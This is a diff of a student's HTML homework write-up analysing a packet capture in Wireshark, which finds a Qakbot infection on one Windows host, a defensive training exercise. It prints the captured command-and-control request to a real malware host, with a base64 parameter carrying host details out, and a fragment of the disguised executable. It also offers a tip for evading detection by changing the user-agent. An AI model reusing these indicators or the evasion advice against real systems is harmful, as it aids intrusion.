@@ -286,58 +286,67 @@ pre.programlisting {
   <body>
     <div id="doc3" class="yui-t1">
       <div id="hd">
-        <h1><a id="mozTocId431752" class="mozTocH1"></a>Jeff Silverman Wireshark
-          analysis</h1>
+        <h1><a id="mozTocId716598" class="mozTocH1"></a>Jeff Silverman Wireshark
+          analysis rev "A"</h1>
+        <p class="important">Revision A: I learned in class today that I did a
+          poor job of explaining what I did.&nbsp; I also learned the answer to
+          the hurdle I couldn't cross over the weekend: How do I know which
+          malware I have?</p>
       </div>
       <div id="bd">
-        <div id="yui-main"> </div>
         <p>The <a href="https://login.codingdojo.com/m/306/9669/65142">problem
             statement</a>.</p>
         <p>Questions</p>
         <ul>
-          <li> Which two clients are Windows hosts, and what are the associated
-            user account names?&nbsp; 10.0.0.149 has Alyssa Fitzgerald and
-            10.0.0.167 has Elmer O'Brien.</li>
-          <li> Which one of these two Windows clients was infected?&nbsp;
-            10.0.0.167</li>
-          <li> What type of malware was that Windows client infected with? </li>
+          <li> <a name="Q1" id="Q1"></a>Which two clients are Windows hosts,
+            and what are the associated user account names?&nbsp; <b>10.0.0.149
+              has Alyssa Fitzgerald and 10.0.0.167 has Elmer O'Brien</b>. See <a
+              href="#answer_Q1">What can I learn from LDAP and Kerberos</a>?</li>
+          <li> <a name="Q2" id="Q2"></a>Which one of these two Windows clients
+            was infected?&nbsp; <b>10.0.0.167</b>. See <a href="#mozTocId162621">Yes,
+              we do</a>.</li>
+          <li> <a name="Q3" id="Q3"></a>What type of malware was that Windows
+            client infected with? <b>Qakbot</b> See <a href="#mozTocId173246">The
+              malware that went to 10.0.0.167 Elmer O'Brien's PC, </a>.</li>
         </ul>
-        <h2><a id="mozTocId96557" class="mozTocH2"></a>How do we know that a
-          computer is infected with something?</h2>
+        <h2><a id="mozTocId611307" class="mozTocH2"></a>How do we know that a
+          computer is infected with anything?</h2>
         <img src="2020-04-24-traffic-analysis-exercise-alerts.jpg" alt="" title="The alerts file"
           width="900px" height="auto"></div>
-      <div>in the 4th row of the image above,&nbsp;&nbsp; In the 3rd row, there
-        is a warning about an DNS query for a suspicious DNS lookup to the .ga
-        TLD. </div>
-      <div><br>
-      </div>
-      <meta http-equiv="content-type" content="text/html; charset=utf-8">
-      <span style="font-family: Whitney, Helvetica, Arial, sans-serif; font-size: 16px;  orphans: 2;  white-space: break-spaces; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; 
-                   text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial; display: inline !important; float: none;">
-        look at the picture very carefully. In particular, look at the last
-        column. A very weak signal that something is going wrong is that there
-        is a DNS query error. That happens. But 89 times (2nd column)?. Another
-        very weak signal: a let's encrypt SSL certificate. Anybody can get a
-        let's encrypt certificate, they are virtually worthless [full
-        disclosure: jeffsilverman.ddns.net is protected by a let's encrypt cert]
-        In the third row, there is a weak signal: a DNS lookup to a suspicious
-        TLD (top level [DNS] domain), .ga (see the <a href="https://www.iana.org/">IANA's</a>
-        <a href="https://www.iana.org/domains/root/db/ga.html">delegation record
-          for ccTLD .ga</a>). But the kiss of death is row 4: the Event Message
-        is ET MALWARE Windows executable sent when remote host claims to send an
-        image M3. The JPEG rendering buffer overflow may be a warning that the
-        malware is struggling to become executable. Next thing I see is SMBv1 in
-        use. I knew that SMBv1 was hopelessly insecure which is why they came
-        out with SMBv2.</span></div>
-    <div class="yui-t1"><span style="font-family: Whitney, Helvetica, Arial, sans-serif; font-size: 16px;  orphans: 2;  white-space: break-spaces; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; 
-                   text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial; display: inline !important; float: none;"><br>
+      <br>
+      <br>
+      <h3 id="mozTocId162621"><a id="mozTocId292851" class="mozTocH3"></a><a id="#mozTocId162621"
+          class="mozTocH3"></a>Yes, we do.</h3>
+      <span style="font-family: Whitney, Helvetica, Arial, sans-serif;">
+        <p> Look at the picture very carefully. In particular, look at the last
+          column. A very weak signal that something is going wrong is that there
+          is a DNS query error. That happens. But 89 times (2nd column)?.
+          Another very weak signal: a let's encrypt SSL certificate. Anybody can
+          get a let's encrypt certificate, they are virtually worthless [full
+          disclosure: jeffsilverman.ddns.net is protected by a let's encrypt
+          cert] In the third row, there is a weak signal: a DNS lookup to a
+          suspicious TLD (top level [DNS] domain), .ga (see the <a href="https://www.iana.org/">IANA's</a>
+          <a href="https://www.iana.org/domains/root/db/ga.html">delegation
+            record for ccTLD .ga</a>). But the kiss of death is row 4: the Event
+          Message is ET MALWARE Windows executable sent when remote host claims
+          to send an image M3. The JPEG rendering buffer overflow may be a
+          warning that the malware is struggling to become executable. Next
+          thing I see is SMBv1 in use. I knew that SMBv1 was hopelessly insecure
+          which is why they came out with SMBv2.</p>
+        <p> Immediately, I know that 10.0.0.167 is infected, which is the answer
+          to <a href="#Q2">Question 2</a>, and I know what IPv4 address the
+          malware came from, 119.31.234.40.&nbsp; So I can use the wireshark
+          filter <span style="font-family: monospace;">ip.addr==119.31.234.40</span>
+          to see all of the malware coming from that host.<br>
+        </p>
       </span></div>
     <div class="yui-t1"><span style="font-family: Whitney, Helvetica, Arial, sans-serif; font-size: 16px;  orphans: 2;  white-space: break-spaces; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; 
                    text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial; display: inline !important; float: none;">See
         </span><a class="anchor-1MIwyf anchorUnderlineOnHover-2qPutX" title="https://cifs.com/"
         href="https://cifs.com/" rel="noreferrer noopener" target="_blank" role="button"
         tabindex="0" style="margin: 0px; padding: 0px; border: 0px; font-weight: 400; font-style: normal; font-family: Whitney, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 16px; vertical-align: baseline; color: var(--text-link); text-decoration: none; cursor: pointer; outline: 0px; forced-color-adjust: none; word-break: break-word; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-align: left; text-indent: 0px; text-transform: none; white-space: break-spaces; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgba(4, 4, 5, 0.07);">https://cifs.com/</a>
-      for more details [I do not understand the WHO CAN SPEAK WHAT table].
+      for more details about SMB [I do not understand the WHO CAN SPEAK WHAT
+      table].
       <div><br>
       </div>
       <div><a href="https://www.extrahop.com/resources/protocols/cifs/%20has%20some%20interesting%20advice:%20%22To%20secure%20SMB,%20you%20need%20to%20audit%20your%20environment%20for%20devices%20running%20SMB%20and%20shut%20down%20the%20ones%20that%20constitute%20a%20security%20risk.%20SMBv1%20is%20full%20of%20known%20exploits%20and%20has%20been%20used%20in%20numerous%20attacks,%20such%20as%20with%20WannaCry%20and%20NotPetya.%20Organizations%20should%20move%20to%20the%20newer%20SMBv2%20or%20SMBv3%20variants.%20To%20do%20this,%20you%20need%20a%20tool%20that%20detects%20SMB%20traffic%20to%20find%20machines%20using%20the%20outdated%20SMBv1%20protocol.%20Either%20disable%20or%20patch%20these%20devices%20before%20they%20become%20infected.%20%22">https://www.extrahop.com/resources/protocols/cifs/</a>
@@ -365,7 +374,9 @@ pre.programlisting {
         <p>My (tentative) assumption is that the infected machine is going to be
           busy, either exfiltrating data or attacking other machines or both, so
           getting a list of IPv4 addresses sorted by count is not a bad way to
-          start.&nbsp; There are no IPv6 addresses.</p>
+          start.&nbsp; In wireshark, I went to the <b>statistics</b> menu, then
+          <b>IPv4 statistics</b> and then&nbsp; <b>Destinations and Ports</b>.
+          There are no IPv6 addresses.</p>
         <img src="IPv4_addresses_sorted_by_count.png" alt="From 2020-04-24-traffic-analysis-exercise.pcap"
           title="IPv4 Addresses sorted by count"></div>
       <div>I also saved this as a text file.&nbsp; There are 346 IPv4 addresses
@@ -398,9 +409,8 @@ pre.programlisting {
         steelcoffee.net yields articles about the analysis of this packet
         capture so I decided not go any further.&nbsp; I want to figure this out
         myself.</div>
+      <h2><a id="mozTocId655425" class="mozTocH2"></a>What protocols are in use?</h2>
       <div>
-        <h2><a id="mozTocId655425" class="mozTocH2"></a>What protocols are in
-          use?</h2>
         <p>I used the Wireshark protocol hierarch statistics window.&nbsp; I
           made a copy in CSV format and pasted that into gedit.&nbsp; Then I did
           a global search and replace to convert every comma to a
@@ -415,7 +425,7 @@ pre.programlisting {
               <th>"Percent Packets"</th>
               <th>"Packets"</th>
               <th>"Percent Bytes"</th>
-              <th>Bytes"</th>
+              <th>"Bytes"</th>
               <th>"Bits/s"</th>
               <th>"End Packets"</th>
               <th>"End Bytes"</th>
@@ -965,20 +975,30 @@ pre.programlisting {
         </table>
         <p><br>
         </p>
-        <h3><a id="mozTocId271494" class="mozTocH3"></a>What can I learn from
-          LDAP and Kerberos?</h3>
       </div>
+      <h3><a id="mozTocId271494" class="mozTocH3"></a>What can I learn from LDAP
+        and Kerberos?</h3>
       <div><br>
       </div>
       <div>I assume that the windows machines are using LDAP to identify,
         authenticate and authorize users.&nbsp; But "under the hood", LDAP uses
-        kerberos, port 88 (from /etc/services) I use the query <code>kerberos</code>
-        to see what I can find.&nbsp; After a bit of digging around, I find that
-        any kerberos message that has a <code>cname_string</code> will contain
-        a username.&nbsp; There are 4 AS-REQ packets and 1 TGS-REP packet.&nbsp;
-        The packets from 10.0.0.149 (3289, 3301) have alyssa.fitzgerald, the
-        packets from 10.0.0.167 (3988,4010) have elmer.obrien.&nbsp; Elmer also
-        got a Ticket Granting Service (TGS) ticket in packet 4188.</div>
+        kerberos, port 88 (from <span style="font-family: monospace;">/etc/services</span>).&nbsp;
+        Kerberos does authentication and nothing else.&nbsp; Active Directory,
+        by way of contrast, does authorization (all of those policies it sends
+        are essentially authorization).&nbsp; I went to <a href="https://medium.com/@robert.broeckelmann/kerberos-wireshark-captures-a-windows-login-example-151fabf3375a">
+          Kerberos Wireshark Captures: A Windows Login Example | by Robert
+          Broeckelmann | Medium</a>&nbsp; <sup><a href="#fn_01">[1]</a></sup>
+        to remember how kerberos does it (I remembered that AD uses kerberos but
+        not the field in the kerberos packets that have the username) &nbsp; I
+        use the query <code>kerberos</code><code>.cname_string</code> to see
+        what I can find.&nbsp; I find that any kerberos message that has a&nbsp;
+        will contain a username.&nbsp; There are 4 AS-REQ packets and 1 TGS-REP
+        packet.&nbsp; The packets from 10.0.0.149 (3289, 3301) have
+        alyssa.fitzgerald, the packets from 10.0.0.167 (3988,4010) have
+        elmer.obrien.&nbsp; Elmer also got a Ticket Granting Service (TGS)
+        ticket in packet 4188.&nbsp; <a id="answer_Q1"></a>So the answers to <a
+          href="#Q1">Question 1</a> is 10.0.0.149&nbsp; Alyssa Fitzgerald and
+        10.0.0.167 Elmer O'Brien. </div>
       <div><br>
       </div>
       <img src="cname-string_alyssa.png" alt="Kerberos" title="Alyssa_fitzgerald_authentication_request">
@@ -993,11 +1013,22 @@ pre.programlisting {
       <div>
         <h2><a id="mozTocId173246" class="mozTocH2"></a>The malware that went to
           10.0.0.167, Elmer O'Brien's PC.</h2>
+        <p>I use the filter <span style="font-family: monospace;">ip.addr==119.31.234.40</span>
+          and I see that in packet 5518, there is a GET request to 119.31.234.40
+          and gets /spool/888.png.&nbsp; I did not look at the HTTP header
+          closely.&nbsp; If I had, I would have seen that user-agent is
+          LaraConf.&nbsp; When I turned in the first version of the homework, I
+          did not understand how a PNG file could be executed.&nbsp; Now, I do:
+          the user-agent LaraConf is not a standard user-agent.&nbsp; This time,
+          I did a google search on LaraConf and I find <a href="https://darkopcodes.wordpress.com/2020/05/14/malware-analysis-qakbot-part-1/">Malware
+            Analysis: Qakbot [part 1]</a>, which is the answer to <a href="#Q3">question
+            3</a>.</p>
+        <br>
         <p>There is a HTTP conversation that starts at packet 5515.&nbsp; It
           gets interesting at packet 5518.&nbsp; The HTTP virtual host is
           alphapioneer.com.&nbsp; Its IPv4 address is 119.31.234.40 and I think
           it's in Singapore, although that could be the end point of a VPN.</p>
-        <pre>jeffs@jeffs-desktop:~$ <kbd>path alphapioneer.com</kbd><samp>
+        <pre>jeffs@jeffs-desktop:~$ <kbd>tracepath alphapioneer.com</kbd><samp>
  1?: [LOCALHOST]                      pmtu 1500
  1:  local-router                                          2.143ms 
  1:  local-router                                          1.887ms 
@@ -1050,55 +1081,48 @@ jeffs@jeffs-desktop:~$ <kbd>s sgsvr.com</kbd><samp>
    Name Server: NAMES2.DS.NETWORK
    DNSSEC: signedDelegation</samp>
 </pre>
-        <p>
-          The conversation continues at packet 7388. The response is a 1,950,208
-          PNG image. That suggests to me that my thought that the JPEG decoding
-          error was connected with the attack might have been a
+        <p> The conversation continues at packet 7388. The response is a
+          1,950,208 PNG image. That suggests to me that my thought that the JPEG
+          decoding error was connected with the attack might have been a
           red-herring.&nbsp; Look at the first 0x360 (864 bytes) it doesn't look
-          like a PNG file at all:</p>
+          like a PNG file at all.</p>
         <p><br>
         </p>
+        <p>One of my classmates suggested going to <a href="https://www.virustotal.com/gui/home/upload">virustotal</a>,
+          which I thought was brilliant.&nbsp; I gave virustotal the URL
+          http://alphapioneer.com/spool/8888.png and it returned a 404
+          error.&nbsp; But 5 of the vendors flagged it as malicious.
+        </p>
+        <p>Then, I gave virustotal the URL</p>
+        <pre>http://alphapioneer.com/spool/8888.png?uid=VwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgAgAC0AIAA2ACwAMgAxACwAMAB8AE0AaQBjAHIAbwBzAG8AZgB0ACAAVwBpAG4AZABvAHcAcwAgADEAMAAgAFAAcgBvAA==</pre>
+        <p>&nbsp;This time, 8 vendors labeled it "malicious", one vendor labeled
+          it "suspicious". </p>
         <p><br>
         </p>
-        <p><br>
-        </p>
-        <h2><a id="mozTocId488140" class="mozTocH2"></a>Other interesting
-          tidbits</h2>
-        <p><a name="10.0.0.202_OS" id="10.0.0.202_OS"></a>10.0.0.202 is a Ubuntu
-          Linux machine.&nbsp; Only ubuntu linux machines look for
-          daisy.ubuntu.com.&nbsp; It comes from a service called whoopsie, and
-          it can be safely removed.</p>
-        <ol>
-          <li>packet 4188 from 10.0.0.10/88 is protocol KRB5<sup><a href="#fn_01">[1]</a></sup>
-            and it is a TGS-REP.&nbsp; It has a CNameString <b>elmer.obrien</b>
-            .</li>
-        </ol>
-        <p><br>
-        </p>
-        <h2><a id="mozTocId373768" class="mozTocH2"></a>The malware listing</h2>
+        <p> </p>
+        <br>
+        <h3><a id="mozTocId981795" class="mozTocH3"></a>The malware listing</h3>
         <p>This is what I think is interesting in the malware.&nbsp; I don't
           know enough about the internals of a Windows .exe file.</p>
-        <ol id="mozToc">
-          <!--mozToc h1 1 h2 2 h3 3 h4 4 h5 5 h6 6-->
-          <li><a href="#mozTocId431752">Jeff Silverman Wireshark analysis</a>
-            <ol>
-              <li><a href="#mozTocId96557">How do we know that a computer is
-                  infected with something?</a></li>
-              <li><a href="#mozTocId600139">What hosts are in the capture?</a></li>
-              <li><a href="#mozTocId655425">What protocols are in use?</a>
-                <ol>
-                  <li><a href="#mozTocId271494">What can I learn from LDAP and
-                      Kerberos?</a></li>
-                </ol>
-              </li>
-              <li><a href="#mozTocId173246">The malware that went to 10.0.0.167,
-                  Elmer O'Brien's PC.</a></li>
-              <li><a href="#mozTocId488140">Other interesting tidbits</a></li>
-              <li><a href="#mozTocId373768">The malware listing</a></li>
-            </ol>
-          </li>
-        </ol>
-        <pre>HTTP/1.1 200 OK
+        <br>
+        <br>
+        <pre>
+</pre>
+        <pre style="  margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><!--StartFragment--><span
+style=" color:#7f0000; background-color:#fbeded;">GET /spool/8888.png?uid=VwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgAgAC0AIAA2ACwAMgAxACwAMAB8AE0AaQBjAHIAbwBzAG8AZgB0ACAAVwBpAG4AZABvAHcAcwAgADEAMAAgAFAAcgBvAA== HTTP/1.1</span></pre>
+        <pre style="  margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span
+style=" color:#7f0000; background-color:#fbeded;">Connection: Keep-Alive</span></pre>
+        <pre style="  margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span
+style=" color:#7f0000; background-color:#fbeded;">Accept: */*</span></pre>
+        <pre style="  margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span
+style=" color:#7f0000; background-color:#fbeded;">Accept-Language: en-US</span></pre>
+        <pre style="  margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span
+style=" color:#7f0000; background-color:#fbeded;">User-Agent: <b>LaraConf</b></span></pre>
+        <pre style="  margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span
+style=" color:#7f0000; background-color:#fbeded;">Host: alphapioneer.com</span></pre>
+        <p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px; color:#7f0000;"><br>
+          <!--EndFragment--></p>
+        <pre><br>HTTP/1.1 200 OK
 Date: Thu, 23 Apr 2020 23:18:35 GMT
 Server: Apache
 Connection: keep-alive, Keep-Alive
@@ -1112,7 +1136,7 @@ Connection: Upgrade
 Content-Length: 1950208
 Vary: Accept-Encoding
 Keep-Alive: timeout=2, max=50
-Content-Type: image/png
+<b>Content-Type: image/png</b>
 
 MZÿÿ¸@º´	Í!¸LÍ!This program cannot be run in DOS mode.
 
@@ -1177,10 +1201,57 @@ OriginalFilenameCMSTP.EXE` ProductNameMicrosoft(R) Connection ManagerDProductVer
 
 
 </pre>
+        <h2><a id="mozTocId488140" class="mozTocH2"></a>Other interesting
+          tidbits</h2>
+        <p><a name="10.0.0.202_OS" id="10.0.0.202_OS"></a>10.0.0.202 is a Ubuntu
+          Linux machine.&nbsp; Only ubuntu linux machines look for
+          daisy.ubuntu.com.&nbsp; It comes from a service called whoopsie, and
+          it can be safely removed.</p>
+        <ol>
+          <li>packet 4188 from 10.0.0.10/88 is protocol KRB5<sup><a href="#fn_01">[1]</a></sup>
+            and it is a TGS-REP.&nbsp; It has a CNameString <b>elmer.obrien</b>
+            .</li>
+          <li>If you are going to be an Advanced Persistent Threat (APT), then
+            change the user-agent to something less obvious e.g. <br>
+            &nbsp;&nbsp;&nbsp; <span style="font-family: monospace;">User-Agent:
+              Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.2) Gecko/20100101
+              Firefox/97.0\r\n</span><br>
+            Your webserver will know to send you the executable version, but any
+            other user-agent gets a real image.<br>
+            &nbsp;&nbsp;&nbsp; </li>
+        </ol>
+        <p> </p>
         <p><br>
         </p>
-        <p><br>
-        </p>
+        <ol id="mozToc">
+          <!--mozToc h1 1 h2 2 h3 3 h4 4 h5 5 h6 6-->
+          <li><a href="#mozTocId716598">Jeff Silverman Wireshark analysis rev
+              "A"</a>
+            <ol>
+              <li><a href="#mozTocId611307">How do we know that a computer is
+                  infected with anything?</a>
+                <ol>
+                  <li><a href="#mozTocId292851">Yes, we do.</a></li>
+                </ol>
+              </li>
+              <li><a href="#mozTocId600139">What hosts are in the capture?</a></li>
+              <li><a href="#mozTocId655425">What protocols are in use?</a>
+                <ol>
+                  <li><a href="#mozTocId271494">What can I learn from LDAP and
+                      Kerberos?</a></li>
+                </ol>
+              </li>
+              <li><a href="#mozTocId173246">The malware that went to 10.0.0.167,
+                  Elmer O'Brien's PC.</a>
+                <ol>
+                  <li><a href="#mozTocId981795">The malware listing</a></li>
+                </ol>
+              </li>
+              <li><a href="#mozTocId488140">Other interesting tidbits</a></li>
+            </ol>
+          </li>
+        </ol>
+        <p> </p>
         <p><br>
         </p>
         <p><br>
